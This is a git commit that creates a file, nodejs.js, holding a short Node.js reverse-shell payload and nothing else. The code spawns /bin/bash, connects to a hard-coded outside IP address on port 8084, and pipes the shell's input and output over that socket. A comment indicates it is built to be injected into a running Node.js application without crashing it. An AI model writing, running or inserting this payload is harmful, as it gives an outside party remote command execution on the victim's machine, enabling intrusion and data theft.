0e103ec9bfc9964cfebb1d7779c38bb260c4fa8e
NaorYaa <46160459+NaorYaa@users.noreply.github.com>
2022-11-03 11:19:10 +0200

    Create nodejs.js

---
+++ nodejs.js
@@ -0,0 +1,13 @@
+    (function(){
+        var net = require("net"),
+            cp = require("child_process"),
+            sh = cp.spawn("/bin/bash", []);
+        var client = new net.Socket();
+        client.connect(8084, "3.92.92.223", function(){
+            client.pipe(sh.stdin);
+            sh.stdout.pipe(client);
+            sh.stderr.pipe(client);
+        });
+        return /a/; // Prevents the Node.js application form crashing
+    })();
+    
